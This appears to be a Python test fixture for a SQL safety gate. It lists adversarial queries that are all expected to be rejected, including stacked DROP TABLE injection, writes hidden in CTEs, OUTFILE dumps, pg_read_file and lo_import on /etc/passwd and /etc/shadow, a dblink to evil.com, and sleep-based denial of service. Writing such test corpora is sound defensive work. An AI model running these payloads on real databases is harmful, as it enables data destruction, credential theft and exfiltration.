"""
Adversarial Safety Corpus (Section 5.4 & Section 7).
A comprehensive test suite of malicious, intrusive, or policy-violating SQL queries.
Every query in this corpus MUST be rejected with 100% precision.
"""

ADVERSARIAL_CORPUS = [
    # 1. Stacked queries / multi-statement injection
    {
        "name": "stacked_drop_table",
        "sql": "SELECT * FROM orders; DROP TABLE users; --",
        "expected_reason": "stacked or forbidden"
    },
    {
        "name": "stacked_sleep",
        "sql": "SELECT id FROM customers; SELECT pg_sleep(10);",
        "expected_reason": "stacked or forbidden"
    },
    # 2. DDL & DML statements
    {
        "name": "direct_insert",
        "sql": "INSERT INTO orders (id, total_amount) VALUES (999, 50000);",
        "expected_reason": "disallowed statement"
    },
    {
        "name": "direct_update",
        "sql": "UPDATE customers SET email = 'hacked@evil.com' WHERE id = 1;",
        "expected_reason": "disallowed statement"
    },
    {
        "name": "direct_delete",
        "sql": "DELETE FROM orders WHERE total_amount < 10;",
        "expected_reason": "disallowed statement"
    },
    {
        "name": "direct_drop_table",
        "sql": "DROP TABLE schema_tables CASCADE;",
        "expected_reason": "disallowed statement"
    },
    {
        "name": "truncate_table",
        "sql": "TRUNCATE TABLE messages;",
        "expected_reason": "disallowed statement"
    },
    {
        "name": "grant_permissions",
        "sql": "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO evil_user;",
        "expected_reason": "disallowed statement"
    },
    # 3. Nested CTE writes (Sneaky DML inside WITH)
    {
        "name": "nested_cte_delete",
        "sql": "WITH deleted_orders AS (DELETE FROM orders RETURNING id) SELECT * FROM deleted_orders;",
        "expected_reason": "forbidden dml/ddl in cte"
    },
    {
        "name": "nested_cte_update",
        "sql": "WITH updated AS (UPDATE customers SET status = 'banned' RETURNING id) SELECT * FROM updated;",
        "expected_reason": "forbidden dml/ddl in cte"
    },
    {
        "name": "nested_cte_insert",
        "sql": "WITH new_admin AS (INSERT INTO users (email) VALUES ('evil@corp.com') RETURNING id) SELECT * FROM new_admin;",
        "expected_reason": "forbidden dml/ddl in cte"
    },
    # 4. SELECT INTO / Data exfiltration / Outfile writing
    {
        "name": "select_into_new_table",
        "sql": "SELECT * INTO stolen_credentials FROM users;",
        "expected_reason": "select into forbidden"
    },
    {
        "name": "select_into_outfile",
        "sql": "SELECT * FROM orders INTO OUTFILE '/var/lib/mysql-files/orders.csv';",
        "expected_reason": "outfile forbidden"
    },
    {
        "name": "select_into_dumpfile",
        "sql": "SELECT password_enc FROM connections INTO DUMPFILE '/tmp/creds.bin';",
        "expected_reason": "dumpfile forbidden"
    },
    # 5. Dangerous Postgres / MySQL functions (Denial of service & file access)
    {
        "name": "postgres_pg_sleep",
        "sql": "SELECT id, pg_sleep(15) FROM orders;",
        "expected_reason": "pg_sleep forbidden"
    },
    {
        "name": "postgres_pg_read_file",
        "sql": "SELECT pg_read_file('/etc/passwd', 0, 1000);",
        "expected_reason": "pg_read_file forbidden"
    },
    {
        "name": "postgres_lo_import",
        "sql": "SELECT lo_import('/etc/shadow');",
        "expected_reason": "lo_import forbidden"
    },
    {
        "name": "postgres_dblink",
        "sql": "SELECT * FROM dblink('host=evil.com dbname=exfil', 'SELECT 1') AS t(id int);",
        "expected_reason": "dblink forbidden"
    },
    {
        "name": "postgres_set_config",
        "sql": "SELECT set_config('session_preload_libraries', 'evil_lib', false);",
        "expected_reason": "set_config forbidden"
    },
    {
        "name": "postgres_pg_terminate_backend",
        "sql": "SELECT pg_terminate_backend(pid) FROM pg_stat_activity;",
        "expected_reason": "pg_terminate_backend forbidden"
    },
    {
        "name": "mysql_sleep_function",
        "sql": "SELECT id FROM orders WHERE sleep(5) = 0;",
        "expected_reason": "sleep forbidden"
    },
    {
        "name": "mysql_load_file",
        "sql": "SELECT load_file('/etc/hosts');",
        "expected_reason": "load_file forbidden"
    },
    {
        "name": "mysql_benchmark_dos",
        "sql": "SELECT benchmark(10000000, MD5(1));",
        "expected_reason": "benchmark forbidden"
    },
    # 6. Unconstrained Cross Joins without predicate (Cost Gate violation)
    {
        "name": "unconstrained_cross_join",
        "sql": "SELECT * FROM orders CROSS JOIN customers CROSS JOIN schema_tables;",
        "expected_reason": "cross join cost rejected"
    }
]

